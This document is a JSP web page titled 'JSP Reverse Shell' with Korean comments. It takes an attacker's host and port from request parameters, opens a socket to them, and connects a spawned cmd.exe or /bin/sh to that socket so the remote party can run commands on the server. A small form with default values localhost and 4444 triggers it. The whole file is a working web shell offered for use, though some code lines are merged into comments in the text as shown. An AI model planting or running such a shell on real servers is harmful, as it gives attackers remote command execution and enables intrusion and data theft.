<%@ page import="java.io.*" %>
    <%@ page import="java.net.Socket" %>
        <%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
            <!DOCTYPE html>
            <html>

            <head>
                <meta charset="UTF-8">
                <title>JSP Reverse Shell</title>
            </head>

            <body>
                <% // 리버스 쉘 파라미터 String host=request.getParameter("host"); // 공격자 IP String
                    port=request.getParameter("port"); // 공격자 포트 if (host !=null && port !=null) { try { // 소켓 연결 Socket
                    socket=new Socket(host, Integer.parseInt(port)); // 입출력 스트림 설정 InputStream
                    pi=socket.getInputStream(); OutputStream po=socket.getOutputStream(); // 시스템 명령어 실행을 위한 프로세스 생성
                    String sh=System.getProperty("os.name").toLowerCase().contains("windows") ? "cmd.exe" : "/bin/sh" ;
                    Process process=new ProcessBuilder(sh).redirectErrorStream(true).start(); // 프로세스의 입출력 스트림
                    InputStream processInputStream=process.getInputStream(); OutputStream
                    processOutputStream=process.getOutputStream(); // 소켓으로부터 읽어서 프로세스에 쓰기 new Thread(() -> {
                    try {
                    while (!socket.isClosed()) {
                    while (pi.available() > 0) {
                    processOutputStream.write(pi.read());
                    }
                    processOutputStream.flush();
                    Thread.sleep(50);
                    }
                    } catch (Exception e) {}
                    }).start();

                    // 프로세스로부터 읽어서 소켓에 쓰기
                    new Thread(() -> {
                    try {
                    while (!socket.isClosed()) {
                    while (processInputStream.available() > 0) {
                    po.write(processInputStream.read());
                    }
                    po.flush();
                    Thread.sleep(50);
                    }
                    } catch (Exception e) {}
                    }).start();

                    out.println("리버스 쉘이 실행되었습니다.");
                    } catch (Exception e) {
                    out.println("에러 발생: " + e.getMessage());
                    }
                    } else {
                    %>
                    <h3>JSP Reverse Shell</h3>
                    <form method="GET">
                        <p>
                            Host: <input type="text" name="host" value="localhost">
                            Port: <input type="text" name="port" value="4444">
                            <input type="submit" value="연결">
                        </p>
                    </form>
                    <% } %>
            </body>

            </html>